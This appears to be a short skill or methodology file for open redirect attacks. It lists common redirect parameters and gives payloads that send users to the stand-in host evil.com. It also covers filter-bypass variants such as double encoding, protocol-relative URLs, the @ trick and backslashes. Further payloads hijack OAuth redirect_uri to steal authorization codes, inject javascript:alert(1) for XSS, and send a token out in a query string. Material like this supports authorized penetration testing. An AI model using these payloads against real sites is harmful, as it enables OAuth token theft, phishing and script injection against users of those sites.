---
name: open-redirect
description: Open redirect testing - OAuth redirect_uri bypass, filter bypass, parameter pollution
---

# Open Redirect Attack Methodology

## Step 1: Identify Redirect Endpoints
```
/redirect?url=
/redirect?next=
/redirect?to=
/redirect?dest=
/callback?redirect_uri=
/oauth?redirect_uri=
```

## Step 2: Basic Redirect
```
/redirect?url=https://evil.com
/redirect?next=https://evil.com
```

## Step 3: Filter Bypass
```
# Double URL encoding
/redirect?url=https://evil.com%252F

# Protocol relative
/redirect?url=//evil.com

# Subdomain trick
/redirect?url=https://target.evil.com

# Path traversal
/redirect?url=https://target.com@evil.com

# Backslash
/redirect?url=https://evil.com\
```

## Step 4: OAuth Bypass
```
# Steal OAuth code
/authorize?redirect_uri=https://evil.com/callback

# XSS via redirect
/redirect?url=javascript:alert(1)

# Data exfiltration
/redirect?url=https://evil.com/?token=STOLEN
```

## Impact
- OAuth code/token theft
- Phishing via trusted domain
- XSS via redirect
